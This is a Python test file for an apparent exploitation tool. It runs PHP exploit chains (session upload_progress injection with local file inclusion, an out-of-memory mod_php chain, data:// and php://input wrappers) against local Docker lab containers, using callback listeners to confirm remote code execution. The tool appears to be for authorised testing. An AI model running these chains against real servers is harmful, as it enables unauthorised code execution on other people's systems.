"""End-to-end exploit chain tests against the Docker lab.

These tests validate the complete exploit pipeline including RCE
verification through the callback listener. They require:

    1. Docker lab running:
       cd lab && docker compose up -d --build
       cd lab && docker compose -f docker-compose.chaind-test.yml up -d --build

    2. Network connectivity between host and Docker containers
       (172.17.0.1 or host.docker.internal must be reachable from containers)

Run:
    python -m pytest tests/test_e2e_chains.py -v -s

These tests are SLOW (10-60s each) and send real exploit payloads to
localhost containers. They are skipped when the lab is not running.
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
import urllib.error
import urllib.request

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)


def _lab_reachable(port: int) -> bool:
    try:
        with urllib.request.urlopen(
            f"http://127.0.0.1:{port}/status.php", timeout=3
        ) as resp:
            return resp.status == 200
    except (urllib.error.URLError, OSError):
        return False


def _docker_host_ip() -> str:
    """Best-effort Docker host IP for callback."""
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.connect(("127.0.0.1", 18080))
        ip = s.getsockname()[0]
        s.close()
        if ip != "127.0.0.1":
            return ip
    except Exception:
        pass
    return "172.17.0.1"


APACHE_UP = _lab_reachable(18080)
CHAIND_UP = _lab_reachable(18084)
CHAIND_ERRORS_UP = _lab_reachable(18085)

SKIP_MSG = "Docker lab not running (start with: cd lab && docker compose up -d)"
HOST_IP = _docker_host_ip() if APACHE_UP else "172.17.0.1"


def _load_case(outdir: str) -> dict:
    with open(os.path.join(outdir, "case.json")) as f:
        return json.load(f)


class ChainAEndToEnd(unittest.TestCase):
    """Chain A: session upload_progress injection + LFI → RCE."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_chain_a_with_known_lfi(self):
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "chain-a")
            rc = main([
                "exploit", "http://127.0.0.1:18080",
                "--chain", "A",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--lfi-path", "/vuln.php?file=",
                "--session-path", "/tmp/sessions/sess_",
                "--inject-path", "/index.php",
                "--command", "id",
                "--exec-func", "system",
                "--attempts", "5",
                "--race-delay", "0.05",
                "--max-seconds", "60",
                "--callback-port", "0",
                "--callback-ip", HOST_IP,
                "--status-url", "http://127.0.0.1:18080/status.php",
                "--health-url", "http://127.0.0.1:18080/status.php",
                "--out", outdir,
            ])
            case = _load_case(outdir)
            env = case.get("environment", {})
            exploit = env.get("exploit", {})
            if rc == 1:
                self.assertTrue(
                    exploit.get("rce_confirmed", False)
                    or any("CODE_EXECUTION" in r.get("status", "")
                           for r in case.get("scenario_runs", [])),
                    "exit 1 should mean RCE confirmed or proof status"
                )


class ChainCEndToEnd(unittest.TestCase):
    """Chain C: direct callback via upload_progress filename → RCE."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_chain_c_with_callback(self):
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "chain-c")
            rc = main([
                "exploit", "http://127.0.0.1:18080",
                "--chain", "C",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--lfi-path", "/vuln.php?file=",
                "--session-path", "/tmp/sessions/sess_",
                "--command", "id",
                "--attempts", "5",
                "--max-seconds", "60",
                "--callback-port", "0",
                "--callback-ip", HOST_IP,
                "--status-url", "http://127.0.0.1:18080/status.php",
                "--health-url", "http://127.0.0.1:18080/status.php",
                "--out", outdir,
            ])
            self.assertIn(rc, (0, 1, 2))
            case = _load_case(outdir)
            self.assertIn("environment", case)


class ChainDEndToEnd(unittest.TestCase):
    """Chain D: pure OOM mod_php exploitation (no LFI needed)."""

    @unittest.skipUnless(CHAIND_UP, "Chain D lab not running")
    def test_chain_d_oom_exploit(self):
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "chain-d")
            rc = main([
                "exploit", "http://127.0.0.1:18084",
                "--chain", "D",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--command", "id",
                "--max-seconds", "120",
                "--callback-port", "0",
                "--callback-ip", HOST_IP,
                "--status-url", "http://127.0.0.1:18084/status.php",
                "--health-url", "http://127.0.0.1:18084/status.php",
                "--out", outdir,
            ])
            self.assertIn(rc, (0, 1, 2))
            case = _load_case(outdir)
            env = case.get("environment", {})
            if rc == 1:
                exploit = env.get("exploit", {})
                self.assertTrue(exploit.get("rce_confirmed", False))


class AutoModeEndToEnd(unittest.TestCase):
    """Auto mode: full pipeline from discovery through exploit chains."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_auto_full_pipeline(self):
        """Full auto mode run with discovery + exploit chains."""
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "auto")
            rc = main([
                "auto", "http://127.0.0.1:18080",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--command", "id",
                "--max-discover-requests", "100",
                "--max-exploit-requests", "30",
                "--max-seconds", "120",
                "--max-spider-pages", "10",
                "--callback-port", "0",
                "--callback-ip", HOST_IP,
                "--out", outdir,
            ])
            self.assertIn(rc, (0, 1))
            case = _load_case(outdir)
            env = case.get("environment", {})
            self.assertIn("discovery", env)
            self.assertIn("chains_attempted", env)

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_auto_report_cycle(self):
        """Auto mode → report rebuild → verify integrity."""
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            auto_dir = os.path.join(tmpdir, "auto")
            main([
                "auto", "http://127.0.0.1:18080",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--max-discover-requests", "50",
                "--max-exploit-requests", "10",
                "--max-seconds", "60",
                "--out", auto_dir, "--json",
            ])
            report_dir = os.path.join(tmpdir, "report")
            rc_report = main(["report", auto_dir, "--out", report_dir, "--json"])
            self.assertIn(rc_report, (0, 1, 2))

            rc_verify = main(["verify", auto_dir, "--json"])
            self.assertEqual(rc_verify, 0)


class WrapperChainEndToEnd(unittest.TestCase):
    """Auto mode with wrapper (data:// / php://input) chain detection."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_auto_detects_wrapper_if_available(self):
        """If allow_url_include is On, auto mode should detect wrapper execution."""
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "auto-wrapper")
            rc = main([
                "auto", "http://127.0.0.1:18080",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--max-discover-requests", "80",
                "--max-exploit-requests", "20",
                "--max-seconds", "60",
                "--callback-port", "0",
                "--callback-ip", HOST_IP,
                "--out", outdir, "--json",
            ])
            self.assertIn(rc, (0, 1))
            case = _load_case(outdir)
            env = case.get("environment", {})
            discovery = env.get("discovery", {})
            if discovery.get("wrapper_works"):
                chains = env.get("chains_attempted", [])
                wrapper_chains = [c for c in chains if "WRAPPER" in c.get("chain", "")]
                self.assertTrue(len(wrapper_chains) > 0,
                              "wrapper detected but WRAPPER chain not attempted")


class EvidenceIntegrityEndToEnd(unittest.TestCase):
    """Verify evidence chain integrity across all modes."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_evidence_hashes_valid_after_prove(self):
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "prove")
            main([
                "prove", "http://127.0.0.1:18080",
                "--scenario", "618-S2",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--status-url", "http://127.0.0.1:18080/status.php",
                "--health-url", "http://127.0.0.1:18080/status.php",
                "--out", outdir,
            ])
            rc = main(["verify", outdir, "--json"])
            self.assertEqual(rc, 0, "evidence integrity check must pass")


if __name__ == "__main__":
    unittest.main()
